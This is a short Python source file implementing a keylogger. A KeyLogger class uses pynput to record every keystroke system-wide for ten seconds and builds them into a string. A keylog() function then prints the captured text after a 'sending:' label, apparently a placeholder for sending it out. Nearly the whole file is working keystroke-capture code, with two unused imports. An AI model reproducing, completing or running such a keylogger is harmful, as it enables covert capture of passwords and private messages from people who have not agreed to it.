import threading
from cv2 import KeyPoint_overlap

# external
import keyboard
from pynput.keyboard import Listener

LISTEN_INTERVAL = 10


class KeyLogger:
    def __init__(self) -> None:
        self.keys_pressed = ""
        self.listen_thread = threading.Thread(target=self.listen)
        self.status = False

    def start(self):
        self.status = True
        print('Keylogger started')
        self.listen_thread.start()
        # print('thread ended')

    def listen(self):
        print('listener starting')
        with Listener(on_press=self.keylogger) as listener:
            threading.Timer(LISTEN_INTERVAL, listener.stop).start()
            print('listener started for', LISTEN_INTERVAL, 'seconds')
            listener.join()
            print(LISTEN_INTERVAL, 'seconds passed, listener ending')
        return

    def isAlive(self):
        return self.listen_thread.is_alive()

    # def print(self):
    #     self.keys_pressed += self.recent_keys
    #     msg = self.recent_keys
    #     self.recent_keys = ""
    #     return msg

    def stop(self):
        self.status = False

    def keylogger(self, key):
        if self.status:
            tmp = str(key)
            if tmp == 'Key.space':
                tmp = ' '
            elif tmp.startswith('Key.'):
                tmp = '<' + tmp + '>'
            elif tmp == '"\'"':
                tmp = "'"
            else:
                tmp = tmp.replace("'", "")

            self.keys_pressed += str(tmp)
            print(str(tmp), 'recorded')

        return


def keylog():
    logger = KeyLogger()
    logger.start()
    while logger.isAlive():
        pass

    print('sending: ', logger.keys_pressed)
